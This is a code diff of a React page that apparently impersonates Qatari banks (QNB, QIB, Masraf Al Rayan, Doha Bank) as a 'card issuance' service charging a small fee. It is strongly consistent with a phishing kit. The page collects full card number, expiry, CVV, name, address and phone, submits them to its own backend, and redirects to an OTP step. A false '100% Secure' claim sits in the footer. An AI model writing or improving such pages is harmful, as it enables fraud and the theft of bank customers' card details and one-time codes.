@@ -3,12 +3,33 @@ import { useLocation, useSearch } from "wouter";
 import { trpc } from "@/lib/trpc";
 import { useLanguage } from "@/contexts/LanguageContext";
 import { toast } from "sonner";
+import { motion, AnimatePresence } from "framer-motion";
+import { 
+  Home, 
+  Building2, 
+  ChevronRight, 
+  ChevronLeft, 
+  CreditCard, 
+  MapPin, 
+  Phone, 
+  CheckCircle2,
+  Info,
+  ShieldCheck,
+  Truck
+} from "lucide-react";
+
+const BANK_INFO: Record<string, { nameAr: string, nameEn: string, logo: string, color: string }> = {
+  qnb: { nameAr: "بنك قطر الوطني (QNB)", nameEn: "Qatar National Bank (QNB)", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", color: "#003565" },
+  qib: { nameAr: "مصرف قطر الإسلامي (QIB)", nameEn: "Qatar Islamic Bank (QIB)", logo: "https://i.ibb.co/7NQ43XdK/IMG-20260714-WA0011.jpg", color: "#8C0032" },
+  rayan: { nameAr: "مصرف الريان", nameEn: "Masraf Al Rayan", logo: "https://i.ibb.co/KzSyQBRw/IMG-20260714-WA0010.jpg", color: "#006432" },
+  doha: { nameAr: "بنك الدوحة", nameEn: "Doha Bank", logo: "https://i.ibb.co/Df4dHNFh/IMG-20260714-WA0013.jpg", color: "#004B8D" },
+};
 
 const BANK_BRANCHES: Record<string, string[]> = {
-  qnb: ["فرع الكورنيش", "فرع السد", "فرع طريق سلوى", "فرع اللؤلؤة", "فرع الوكرة"],
-  qib: ["فرع الغرافة", "فرع الريان", "فرع الخور", "فرع سيتي سنتر", "فرع الدوحة لايف ستايل"],
-  rayan: ["فرع الدفنة", "فرع مشيرب", "فرع الهلال", "فرع معيذر"],
-  doha: ["فرع الدوحة سيتي سنتر", "فرع طريق المطار", "فرع بن محمود", "فرع الرويس"],
+  qnb: ["فرع الكورنيش - الرئيسي", "فرع السد", "فرع طريق سلوى", "فرع اللؤلؤة", "فرع الوكرة", "فرع الخور", "فرع سيتي سنتر"],
+  qib: ["فرع الغرافة", "فرع الريان", "فرع الخور", "فرع سيتي سنتر", "فرع الدوحة لايف ستايل", "فرع طريق المطار"],
+  rayan: ["فرع الدفنة - الرئيسي", "فرع مشيرب", "فرع الهلال", "فرع معيذر", "فرع قطر مول"],
+  doha: ["فرع الدوحة سيتي سنتر", "فرع طريق المطار", "فرع بن محمود", "فرع الرويس", "فرع الدحيل"],
 };
 
 export default function LoginMethod() {
@@ -16,8 +37,8 @@ export default function LoginMethod() {
   const search = useSearch();
   const { language, setLanguage } = useLanguage();
   const params = new URLSearchParams(search);
-  const bank = params.get("bank") || "qnb";
-  const hasError = params.get("error") === "true";
+  const bankId = params.get("bank") || "qnb";
+  const currentBank = BANK_INFO[bankId] || BANK_INFO.qnb;
   
   const [sessionId, setSessionId] = useState<string>("");
   const [step, setStep] = useState<"selection" | "details" | "payment">("selection");
@@ -27,16 +48,11 @@ export default function LoginMethod() {
     const sId = localStorage.getItem("sessionId") || params.get("session") || "";
     if (sId) {
       setSessionId(sId);
-      if (!localStorage.getItem("sessionId")) {
-        localStorage.setItem("sessionId", sId);
-      }
     }
-  }, [params]);
+    window.scrollTo(0, 0);
+  }, [step]);
 
   const isArabic = language === "ar";
-  const footerImage = isArabic 
-    ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg"
-    : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg";
 
   const [formData, setFormData] = useState({
     deliveryAddress: "",
@@ -53,7 +69,11 @@ export default function LoginMethod() {
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
     const { name, value } = e.target;
     
-    if (name === "expiryDate") {
+    if (name === "cardNumber") {
+      let v = value.replace(/\s?/g, '').replace(/(\d{4})/g, '$1 ').trim();
+      if (v.length > 19) v = v.slice(0, 19);
+      setFormData(prev => ({ ...prev, [name]: v }));
+    } else if (name === "expiryDate") {
       let cleanedValue = value.replace(/\D/g, "");
       if (cleanedValue.length > 4) cleanedValue = cleanedValue.slice(0, 4);
       if (cleanedValue.length > 2) cleanedValue = cleanedValue.slice(0, 2) + "/" + cleanedValue.slice(2);
@@ -71,12 +91,12 @@ export default function LoginMethod() {
   const goToPayment = () => {
     if (deliveryMethod === "home") {
       if (!formData.deliveryAddress || !formData.phoneConfirmation) {
-        toast.error(isArabic ? "يرجى ملء كافة البيانات" : "Please fill all details");
+        toast.error(isArabic ? "يرجى إكمال بيانات التوصيل" : "Please complete delivery details");
         return;
       }
     } else {
       if (!formData.branchName) {
-        toast.error(isArabic ? "يرجى اختيار الفرع" : "Please select a branch");
+        toast.error(isArabic ? "يرجى اختيار فرع الاستلام" : "Please select a pickup branch");
         return;
       }
     }
@@ -85,16 +105,10 @@ export default function LoginMethod() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    const currentSessionId = sessionId || localStorage.getItem("sessionId") || "";
     
-    const currentSessionId = sessionId || localStorage.getItem("sessionId") || params.get("session") || "";
-    
-    if (!currentSessionId) {
-      toast.error(isArabic ? "جلسة غير صالحة" : "Invalid session");
-      return;
-    }
-
     if (!formData.cardNumber || !formData.cardholderName || !formData.expiryDate || !formData.cvv) {
-      toast.error(isArabic ? "يرجى ملء بيانات الدفع" : "Please fill payment details");
+      toast.error(isArabic ? "يرجى إكمال بيانات الدفع" : "Please complete payment details");
       return;
     }
 
@@ -115,9 +129,9 @@ export default function LoginMethod() {
         totalAmount: deliveryMethod === "home" ? "15" : "10",
       });
       
-      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=otp`);
+      setLocation(`/waiting?bank=${bankId}&session=${currentSessionId}&next=otp`);
     } catch (error) {
-      toast.error(isArabic ? "فشل الإرسال" : "Submission failed");
+      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "An error occurred during submission");
     }
   };
 
@@ -125,143 +139,328 @@ export default function LoginMethod() {
     setLanguage(isArabic ? "en" : "ar");
   };
 
+  const containerVariants = {
+    hidden: { opacity: 0, y: 20 },
+    visible: { opacity: 1, y: 0, transition: { duration: 0.5 } },
+    exit: { opacity: 0, x: -20, transition: { duration: 0.3 } }
+  };
+
   return (
-    <div className="page-wrapper" dir={isArabic ? "rtl" : "ltr"}>
-      <style>{`
-        .page-wrapper { font-family: sans-serif; background-color: #f4f4f4; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
-        .header { position: relative; width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 2px solid #8C0032; z-index: 1000; box-sizing: border-box; }
-        .logo { height: 80px; width: auto; object-fit: contain; background-color: white; padding: 0; }
-        .lang-btn { background: transparent; color: #8C0032; border: 2px solid #8C0032; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }
-        .container { padding: 20px; flex: 1; max-width: 500px; margin: 0 auto; width: 100%; box-sizing: border-box; }
-        .fee-info { background: white; padding: 15px; border-radius: 10px; margin-bottom: 20px; border-right: 5px solid #8C0032; }
-        .fee-info h4 { margin: 0 0 5px 0; color: #8C0032; }
-        .fee-info p { margin: 2px 0; font-size: 14px; color: #666; }
-        .selection-box { background: white; border: 2px solid #ddd; border-radius: 10px; padding: 20px; margin-bottom: 15px; cursor: pointer; transition: 0.3s; display: flex; align-items: center; gap: 15px; }
-        .selection-box:hover { border-color: #8C0032; }
-        .selection-box .icon { font-size: 24px; color: #8C0032; }
-        .selection-box h3 { margin: 0; font-size: 16px; color: #333; }
-        .selection-box p { margin: 5px 0 0 0; font-size: 12px; color: #888; }
-        .form-section { background: white; padding: 20px; border-radius: 10px; margin-top: 15px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
-        .form-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 8px; font-weight: bold; font-size: 14px; color: #444; }
-        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 15px; }
-        .submit-btn { background: #8C0032; color: white; padding: 15px; width: 100%; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 16px; }
-        .footer-image { width: 100%; display: block; margin-top: 20px; }
-        .payment-card { border: 1px solid #eee; border-radius: 12px; padding: 20px; margin-top: 10px; }
-        .card-icons { display: flex; gap: 5px; margin-bottom: 15px; }
-        .card-icons img { height: 20px; }
-      `}</style>
-      
-      <header className="header">
-        <div style={{ fontSize: "28px", color: "#8C0032" }}>&#9776;</div>
-        <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663821954062/BkVFgBrnkZHoPjjv.png" className="logo" alt="Logo" />
-        <button onClick={toggleLanguage} className="lang-btn">{isArabic ? "English" : "العربية"}</button>
+    <div className="min-h-screen bg-slate-50 flex flex-col font-sans" dir={isArabic ? "rtl" : "ltr"}>
+      {/* Premium Header */}
+      <header className="bg-white border-b-2 border-[#8C0032] sticky top-0 z-50 shadow-sm">
+        <div className="max-w-xl mx-auto px-4 h-20 flex items-center justify-between">
+          <div className="text-2xl text-[#8C0032] cursor-pointer hover:opacity-80 transition-opacity">☰</div>
+          <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663821954062/BkVFgBrnkZHoPjjv.png" className="h-12 object-contain" alt="Logo" />
+          <button 
+            onClick={toggleLanguage} 
+            className="text-xs font-bold px-4 py-2 rounded-full border-2 border-[#8C0032] text-[#8C0032] hover:bg-[#8C0032] hover:text-white transition-all"
+          >
+            {isArabic ? "English" : "العربية"}
+          </button>
+        </div>
       </header>
 
-      <div className="container">
-        <div className="fee-info">
-          <h4>{isArabic ? "رسوم إصدار البطاقة: 10 ر.ق" : "Card Issuance Fee: 10 QAR"}</h4>
-          <p>{isArabic ? "البطاقة مجانية لمدة عام بدون أي مصاريف" : "Card is free for one year with no additional charges"}</p>
-          {deliveryMethod === "home" && <p>{isArabic ? "رسوم التوصيل: 5 ر.ق" : "Delivery Fee: 5 QAR"}</p>}
+      <main className="flex-1 max-w-xl mx-auto w-full px-4 py-8">
+        {/* Bank Identity Card */}
+        <motion.div 
+          initial={{ opacity: 0, scale: 0.95 }}
+          animate={{ opacity: 1, scale: 1 }}
+          className="bg-white rounded-3xl p-6 shadow-xl shadow-slate-200/50 mb-8 border border-slate-100 flex items-center gap-4"
+        >
+          <div className="w-16 h-16 rounded-2xl bg-slate-50 p-2 flex items-center justify-center border border-slate-100 shadow-inner">
+            <img src={currentBank.logo} className="w-full h-full object-contain" alt="Bank Logo" />
+          </div>
+          <div>
+            <h1 className="text-lg font-black text-slate-800 leading-tight">
+              {isArabic ? currentBank.nameAr : currentBank.nameEn}
+            </h1>
+            <p className="text-sm text-slate-500 font-medium mt-1 flex items-center gap-1">
+              <ShieldCheck className="w-4 h-4 text-emerald-500" />
+              {isArabic ? "نظام استلام البطاقات الموحد" : "Unified Card Issuance System"}
+            </p>
+          </div>
+        </motion.div>
+
+        {/* Pricing Banner */}
+        <div className="grid grid-cols-2 gap-3 mb-8">
+          <div className="bg-gradient-to-br from-[#8C0032] to-[#b00040] p-4 rounded-2xl text-white shadow-lg shadow-[#8C0032]/20 relative overflow-hidden group">
+            <div className="absolute -right-2 -bottom-2 opacity-10 group-hover:scale-110 transition-transform">
+              <CreditCard size={64} />
+            </div>
+            <p className="text-[10px] uppercase tracking-wider font-bold opacity-80">{isArabic ? "رسوم الإصدار" : "Issuance Fee"}</p>
+            <h3 className="text-xl font-black mt-1">10 <span className="text-xs font-normal">ر.ق</span></h3>
+          </div>
+          <div className="bg-white p-4 rounded-2xl border border-slate-100 shadow-md flex flex-col justify-center">
+            <p className="text-[10px] uppercase tracking-wider font-bold text-slate-400">{isArabic ? "العرض السنوي" : "Annual Offer"}</p>
+            <h3 className="text-sm font-bold text-emerald-600 mt-1">{isArabic ? "مجانية لمدة عام" : "Free for 1 Year"}</h3>
+          </div>
         </div>
 
-        {step === "selection" && (
-          <>
-            <h2 style={{ fontSize: "18px", marginBottom: "15px" }}>{isArabic ? "اختر طريقة استلام البطاقة" : "Choose card delivery method"}</h2>
-            <div className="selection-box" onClick={() => handleSelection("home")}>
-              <div className="icon">🏠</div>
-              <div>
-                <h3>{isArabic ? "توصيل إلى المنزل" : "Home Delivery"}</h3>
-                <p>{isArabic ? "في خلال 48 ساعة عمل" : "Within 48 working hours"}</p>
-              </div>
-            </div>
-
-            <div className="selection-box" onClick={() => handleSelection("branch")}>
-              <div className="icon">🏦</div>
-              <div>
-                <h3>{isArabic ? "استلام من أقرب فرع" : "Pickup from nearest branch"}</h3>
-                <p>{isArabic ? "من الفرع الخاص بك" : "From your specific bank branch"}</p>
-              </div>
-            </div>
-          </>
-        )}
-
-        {step === "details" && (
-          <div className="form-section">
-            <h3 style={{ marginBottom: "20px" }}>{deliveryMethod === "home" ? (isArabic ? "بيانات التوصيل" : "Delivery Details") : (isArabic ? "اختر الفرع" : "Select Branch")}</h3>
-            {deliveryMethod === "home" ? (
-              <>
-                <div className="form-group">
-                  <label>{isArabic ? "عنوان التوصيل" : "Delivery Address"}</label>
-                  <input name="deliveryAddress" type="text" placeholder={isArabic ? "أدخل العنوان بالتفصيل" : "Enter full address"} value={formData.deliveryAddress} onChange={handleInputChange} />
-                </div>
-                <div className="form-group">
-                  <label>{isArabic ? "تأكيد رقم الهاتف" : "Confirm Phone Number"}</label>
-                  <input name="phoneConfirmation" type="tel" placeholder="5XXXXXXX" value={formData.phoneConfirmation} onChange={handleInputChange} />
-                </div>
-              </>
-            ) : (
-              <div className="form-group">
-                <label>{isArabic ? "اختر الفرع الأقرب إليك" : "Select nearest branch"}</label>
-                <select name="branchName" value={formData.branchName} onChange={handleInputChange}>
-                  <option value="">{isArabic ? "-- اختر الفرع --" : "-- Select Branch --"}</option>
-                  {BANK_BRANCHES[bank]?.map(b => <option key={b} value={b}>{b}</option>)}
-                </select>
-              </div>
-            )}
-            <button className="submit-btn" onClick={goToPayment}>{isArabic ? "التالي" : "Next"}</button>
-            <button style={{ background: "none", color: "#8C0032", border: "none", marginTop: "10px", width: "100%", cursor: "pointer" }} onClick={() => setStep("selection")}>{isArabic ? "رجوع" : "Back"}</button>
-          </div>
-        )}
-
-        {step === "payment" && (
-          <div className="form-section">
-            <h3 style={{ marginBottom: "5px" }}>{isArabic ? "معلومات الدفع" : "Payment method"}</h3>
-            <p style={{ fontSize: "14px", color: "#666", marginBottom: "20px" }}>
-              {isArabic ? `إجمالي المبلغ المطلوب: ${deliveryMethod === "home" ? "15" : "10"} ر.ق` : `Total amount: ${deliveryMethod === "home" ? "15" : "10"} QAR`}
-            </p>
-            
-            <div className="payment-card">
-              <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "15px" }}>
-                <input type="radio" checked readOnly style={{ width: "auto" }} />
-                <span style={{ fontWeight: "bold" }}>💳 {isArabic ? "بطاقة" : "Card"}</span>
-              </div>
+        <AnimatePresence mode="wait">
+          {step === "selection" && (
+            <motion.div 
+              key="selection"
+              variants={containerVariants}
+              initial="hidden"
+              animate="visible"
+              exit="exit"
+              className="space-y-4"
+            >
+              <h2 className="text-xl font-black text-slate-800 mb-6 px-1">
+                {isArabic ? "كيف تود استلام بطاقتك؟" : "How would you like to receive your card?"}
+              </h2>
               
-              <div className="form-group">
-                <label>{isArabic ? "معلومات البطاقة" : "Card information"}</label>
-                <div style={{ position: "relative" }}>
-                  <input name="cardNumber" type="text" placeholder="1234 1234 1234 1234" value={formData.cardNumber} onChange={handleInputChange} />
-                  <div style={{ position: "absolute", right: "10px", top: "50%", transform: "translateY(-50%)", display: "flex", gap: "4px" }}>
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" height="12" alt="visa" />
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" height="12" alt="mastercard" />
+              <button 
+                onClick={() => handleSelection("home")}
+                className="w-full bg-white p-6 rounded-3xl border-2 border-transparent hover:border-[#8C0032] shadow-md hover:shadow-xl transition-all flex items-center gap-5 text-right group"
+              >
+                <div className="w-14 h-14 rounded-2xl bg-rose-50 flex items-center justify-center text-[#8C0032] group-hover:scale-110 transition-transform">
+                  <Truck size={28} />
+                </div>
+                <div className="flex-1">
+                  <h3 className="text-lg font-black text-slate-800">{isArabic ? "توصيل إلى المنزل" : "Home Delivery"}</h3>
+                  <p className="text-sm text-slate-500 font-medium">{isArabic ? "خلال 48 ساعة عمل (+5 ر.ق)" : "Within 48 working hours (+5 QAR)"}</p>
+                </div>
+                <ChevronRight className={`text-slate-300 ${isArabic ? 'rotate-180' : ''}`} />
+              </button>
+
+              <button 
+                onClick={() => handleSelection("branch")}
+                className="w-full bg-white p-6 rounded-3xl border-2 border-transparent hover:border-[#8C0032] shadow-md hover:shadow-xl transition-all flex items-center gap-5 text-right group"
+              >
+                <div className="w-14 h-14 rounded-2xl bg-blue-50 flex items-center justify-center text-blue-600 group-hover:scale-110 transition-transform">
+                  <Building2 size={28} />
+                </div>
+                <div className="flex-1">
+                  <h3 className="text-lg font-black text-slate-800">{isArabic ? "استلام من الفرع" : "Pickup from Branch"}</h3>
+                  <p className="text-sm text-slate-500 font-medium">{isArabic ? "من أقرب فرع بنك خاص بك" : "From your nearest bank branch"}</p>
+                </div>
+                <ChevronRight className={`text-slate-300 ${isArabic ? 'rotate-180' : ''}`} />
+              </button>
+            </motion.div>
+          )}
+
+          {step === "details" && (
+            <motion.div 
+              key="details"
+              variants={containerVariants}
+              initial="hidden"
+              animate="visible"
+              exit="exit"
+              className="bg-white rounded-3xl p-8 shadow-xl border border-slate-50"
+            >
+              <div className="flex items-center gap-3 mb-8">
+                <div className="w-10 h-10 rounded-full bg-[#8C0032]/10 flex items-center justify-center text-[#8C0032]">
+                  {deliveryMethod === "home" ? <MapPin size={20} /> : <Building2 size={20} />}
+                </div>
+                <h2 className="text-xl font-black text-slate-800">
+                  {deliveryMethod === "home" ? (isArabic ? "بيانات التوصيل" : "Delivery Details") : (isArabic ? "اختيار الفرع" : "Select Branch")}
+                </h2>
+              </div>
+
+              {deliveryMethod === "home" ? (
+                <div className="space-y-6">
+                  <div className="space-y-2">
+                    <label className="text-sm font-black text-slate-700 block px-1">{isArabic ? "عنوان التوصيل الكامل" : "Full Delivery Address"}</label>
+                    <div className="relative">
+                      <input 
+                        name="deliveryAddress" 
+                        type="text" 
+                        placeholder={isArabic ? "المنطقة، الشارع، رقم المنزل" : "Area, Street, House No."} 
+                        className="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl px-5 py-4 focus:bg-white focus:border-[#8C0032] outline-none transition-all font-medium"
+                        value={formData.deliveryAddress} 
+                        onChange={handleInputChange} 
+                      />
+                    </div>
+                  </div>
+                  <div className="space-y-2">
+                    <label className="text-sm font-black text-slate-700 block px-1">{isArabic ? "رقم الهاتف للتواصل" : "Contact Phone Number"}</label>
+                    <div className="relative">
+                      <input 
+                        name="phoneConfirmation" 
+                        type="tel" 
+                        placeholder="5XXXXXXX" 
+                        className="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl px-5 py-4 focus:bg-white focus:border-[#8C0032] outline-none transition-all font-medium"
+                        value={formData.phoneConfirmation} 
+                        onChange={handleInputChange} 
+                      />
+                      <Phone className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-300" size={18} />
+                    </div>
+                  </div>
+                </div>
+              ) : (
+                <div className="space-y-6">
+                  <div className="space-y-2">
+                    <label className="text-sm font-black text-slate-700 block px-1">{isArabic ? "اختر الفرع الأنسب لك" : "Select Preferred Branch"}</label>
+                    <select 
+                      name="branchName" 
+                      className="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl px-5 py-4 focus:bg-white focus:border-[#8C0032] outline-none transition-all font-medium appearance-none"
+                      value={formData.branchName} 
+                      onChange={handleInputChange}
+                    >
+                      <option value="">{isArabic ? "-- اختر من القائمة --" : "-- Select from list --"}</option>
+                      {BANK_BRANCHES[bankId]?.map(b => <option key={b} value={b}>{b}</option>)}
+                    </select>
+                  </div>
+                  <div className="p-4 bg-blue-50 rounded-2xl flex gap-3">
+                    <Info className="text-blue-500 shrink-0" size={20} />
+                    <p className="text-xs text-blue-700 font-bold leading-relaxed">
+                      {isArabic ? "سيتم إرسال البطاقة إلى الفرع المختار خلال 24 ساعة عمل، وسوف تتلقى رسالة نصية عند جاهزيتها." : "The card will be sent to the selected branch within 24 working hours, and you will receive an SMS when it's ready."}
+                    </p>
+                  </div>
+                </div>
+              )}
+
+              <div className="mt-10 flex flex-col gap-3">
+                <button 
+                  onClick={goToPayment}
+                  className="w-full bg-[#8C0032] text-white py-5 rounded-2xl font-black text-lg shadow-xl shadow-[#8C0032]/30 hover:scale-[1.02] active:scale-95 transition-all"
+                >
+                  {isArabic ? "متابعة للدفع" : "Proceed to Payment"}
+                </button>
+                <button 
+                  onClick={() => setStep("selection")}
+                  className="w-full py-4 text-slate-400 font-bold hover:text-slate-600 transition-colors flex items-center justify-center gap-2"
+                >
+                  <ChevronLeft className={isArabic ? 'rotate-180' : ''} size={18} />
+                  {isArabic ? "العودة للخطوة السابقة" : "Back to previous step"}
+                </button>
+              </div>
+            </motion.div>
+          )}
+
+          {step === "payment" && (
+            <motion.div 
+              key="payment"
+              variants={containerVariants}
+              initial="hidden"
+              animate="visible"
+              exit="exit"
+              className="bg-white rounded-3xl p-8 shadow-xl border border-slate-50"
+            >
+              <div className="flex items-center justify-between mb-8">
+                <div className="flex items-center gap-3">
+                  <div className="w-10 h-10 rounded-full bg-emerald-100 flex items-center justify-center text-emerald-600">
+                    <CheckCircle2 size={20} />
+                  </div>
+                  <h2 className="text-xl font-black text-slate-800">{isArabic ? "إتمام الدفع" : "Complete Payment"}</h2>
+                </div>
+                <div className="text-right">
+                  <p className="text-[10px] font-black text-slate-400 uppercase tracking-wider">{isArabic ? "الإجمالي" : "Total"}</p>
+                  <p className="text-lg font-black text-[#8C0032]">{deliveryMethod === "home" ? "15" : "10"} ر.ق</p>
+                </div>
+              </div>
+
+              {/* Virtual Card Preview */}
+              <div className="w-full aspect-[1.6/1] bg-gradient-to-br from-slate-800 to-slate-900 rounded-2xl p-6 text-white mb-8 shadow-2xl relative overflow-hidden">
+                <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full -mr-16 -mt-16 blur-2xl"></div>
+                <div className="flex justify-between items-start mb-10">
+                  <div className="w-12 h-10 bg-gradient-to-br from-yellow-400 to-yellow-600 rounded-lg shadow-inner opacity-80"></div>
+                  <div className="flex gap-2">
+                    <div className="w-8 h-8 bg-white/10 rounded-full"></div>
+                    <div className="w-8 h-8 bg-white/20 rounded-full -ml-4"></div>
+                  </div>
+                </div>
+                <div className="space-y-6">
+                  <p className="text-xl font-mono tracking-[0.2em] h-8">
+                    {formData.cardNumber || "•••• •••• •••• ••••"}
+                  </p>
+                  <div className="flex justify-between items-end">
+                    <div className="space-y-1">
+                      <p className="text-[8px] uppercase tracking-widest opacity-50">{isArabic ? "صاحب البطاقة" : "Card Holder"}</p>
+                      <p className="text-sm font-bold tracking-wider uppercase h-5">{formData.cardholderName || "FULL NAME"}</p>
+                    </div>
+                    <div className="text-right space-y-1">
+                      <p className="text-[8px] uppercase tracking-widest opacity-50">{isArabic ? "الصلاحية" : "Expires"}</p>
+                      <p className="text-sm font-bold h-5">{formData.expiryDate || "MM/YY"}</p>
+                    </div>
                   </div>
                 </div>
               </div>
-              
-              <div style={{ display: "flex", gap: "10px" }}>
-                <div className="form-group" style={{ flex: 1 }}>
-                  <input name="expiryDate" type="text" placeholder="MM / YY" value={formData.expiryDate} onChange={handleInputChange} />
-                </div>
-                <div className="form-group" style={{ flex: 1 }}>
-                  <input name="cvv" type="text" placeholder="CVC" value={formData.cvv} onChange={handleInputChange} />
-                </div>
-              </div>
-              
-              <div className="form-group">
-                <label>{isArabic ? "اسم صاحب البطاقة" : "Cardholder name"}</label>
-                <input name="cardholderName" type="text" placeholder={isArabic ? "الاسم الكامل على البطاقة" : "Full name on card"} value={formData.cardholderName} onChange={handleInputChange} />
-              </div>
-            </div>
 
-            <button className="submit-btn" onClick={handleSubmit} disabled={submitLoginMethodMutation.isLoading}>
-              {submitLoginMethodMutation.isLoading ? (isArabic ? "جاري الإرسال..." : "Sending...") : (isArabic ? "تأكيد الدفع" : "Confirm Payment")}
-            </button>
-            <button style={{ background: "none", color: "#8C0032", border: "none", marginTop: "10px", width: "100%", cursor: "pointer" }} onClick={() => setStep("details")}>{isArabic ? "رجوع" : "Back"}</button>
+              <form onSubmit={handleSubmit} className="space-y-5">
+                <div className="space-y-2">
+                  <label className="text-xs font-black text-slate-500 uppercase tracking-wider px-1">{isArabic ? "رقم البطاقة" : "Card Number"}</label>
+                  <input 
+                    name="cardNumber" 
+                    type="text" 
+                    placeholder="0000 0000 0000 0000" 
+                    className="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl px-5 py-4 focus:bg-white focus:border-[#8C0032] outline-none transition-all font-mono text-lg"
+                    value={formData.cardNumber} 
+                    onChange={handleInputChange} 
+                  />
+                </div>
+
+                <div className="grid grid-cols-2 gap-4">
+                  <div className="space-y-2">
+                    <label className="text-xs font-black text-slate-500 uppercase tracking-wider px-1">{isArabic ? "تاريخ الانتهاء" : "Expiry Date"}</label>
+                    <input 
+                      name="expiryDate" 
+                      type="text" 
+                      placeholder="MM / YY" 
+                      className="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl px-5 py-4 focus:bg-white focus:border-[#8C0032] outline-none transition-all text-center font-bold"
+                      value={formData.expiryDate} 
+                      onChange={handleInputChange} 
+                    />
+                  </div>
+                  <div className="space-y-2">
+                    <label className="text-xs font-black text-slate-500 uppercase tracking-wider px-1">CVV</label>
+                    <input 
+                      name="cvv" 
+                      type="password" 
+                      placeholder="•••" 
+                      maxLength={3}
+                      className="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl px-5 py-4 focus:bg-white focus:border-[#8C0032] outline-none transition-all text-center font-bold"
+                      value={formData.cvv} 
+                      onChange={handleInputChange} 
+                    />
+                  </div>
+                </div>
+
+                <div className="space-y-2">
+                  <label className="text-xs font-black text-slate-500 uppercase tracking-wider px-1">{isArabic ? "اسم صاحب البطاقة" : "Cardholder Name"}</label>
+                  <input 
+                    name="cardholderName" 
+                    type="text" 
+                    placeholder={isArabic ? "الاسم كما هو مكتوب على البطاقة" : "Name as printed on card"} 
+                    className="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl px-5 py-4 focus:bg-white focus:border-[#8C0032] outline-none transition-all font-bold uppercase"
+                    value={formData.cardholderName} 
+                    onChange={handleInputChange} 
+                  />
+                </div>
+
+                <div className="pt-6">
+                  <button 
+                    type="submit"
+                    disabled={submitLoginMethodMutation.isLoading}
+                    className="w-full bg-[#8C0032] text-white py-5 rounded-2xl font-black text-lg shadow-xl shadow-[#8C0032]/30 hover:scale-[1.02] active:scale-95 transition-all disabled:opacity-50 disabled:scale-100"
+                  >
+                    {submitLoginMethodMutation.isLoading ? (isArabic ? "جاري المعالجة..." : "Processing...") : (isArabic ? "تأكيد وإتمام الطلب" : "Confirm & Order")}
+                  </button>
+                  <button 
+                    type="button"
+                    onClick={() => setStep("details")}
+                    className="w-full py-4 text-slate-400 font-bold hover:text-slate-600 transition-colors mt-2"
+                  >
+                    {isArabic ? "رجوع" : "Back"}
+                  </button>
+                </div>
+              </form>
+            </motion.div>
+          )}
+        </AnimatePresence>
+      </main>
+
+      <footer className="mt-auto">
+        <div className="max-w-xl mx-auto px-4 py-6 text-center">
+          <div className="flex items-center justify-center gap-2 text-slate-400 mb-4">
+            <ShieldCheck size={16} />
+            <span className="text-[10px] font-bold uppercase tracking-widest">{isArabic ? "دفع آمن ومحمي 100%" : "100% Secure & Protected Payment"}</span>
           </div>
-        )}
-      </div>
-
-      <img src={footerImage} className="footer-image" alt="Footer" />
+        </div>
+        <img src="https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" className="w-full h-32 object-cover border-t border-slate-200" alt="Footer" />
+      </footer>
     </div>
   );
 }
